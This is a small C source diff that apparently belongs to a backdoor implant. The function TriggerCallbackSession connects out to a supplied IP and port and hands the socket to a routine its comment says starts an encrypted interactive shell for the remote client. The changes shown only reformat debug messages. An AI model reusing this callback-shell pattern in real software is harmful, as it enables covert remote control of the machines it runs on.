@@ -57,7 +57,7 @@ int TriggerCallbackSession( char* ip, int port )
 }
 #else
 //******************************************************************************
-int TriggerCallbackSession( char* ip, int port )
+int TriggerCallbackSession( char *ip, int port )
 {
 	int sock;
 	int retval = 0;
@@ -66,13 +66,13 @@ int TriggerCallbackSession( char* ip, int port )
 	signal( SIGALRM, connect_alarm );
 	if ( alarm( CONNECT_TIMEOUT ) != 0 )
 	{
-		D( printf( " ERROR: alarm() already set\n" ); )
+		D( printf( "%s:%i: ERROR: alarm() already set\n", __FILE__, __LINE__ ); );
 	}
 
 	// connect to client
 	if ( net_connect( &sock, ip, port ) < 0 )
 	{
-		D( printf( " net_connect() failed @ %s:%i.\n", __FILE__, __LINE__ ); )
+		D( printf( "%s:%i: net_connect() failed\n", __FILE__, __LINE__ ); );
 		retval = -1;
 		goto cleanup;
 	}
@@ -84,6 +84,7 @@ int TriggerCallbackSession( char* ip, int port )
 	// We have an established TCP/IP connection.
 	// This will initialize crypto and start the interactive 'shell' with the client.
 	// StartClientSession() will not return until that session closes.
+	D( printf( "%s:%i: Starting client session...\n", __FILE__, __LINE__ ); );
 	retval = StartClientSession( sock );
 		
 	//alarm( 0 );
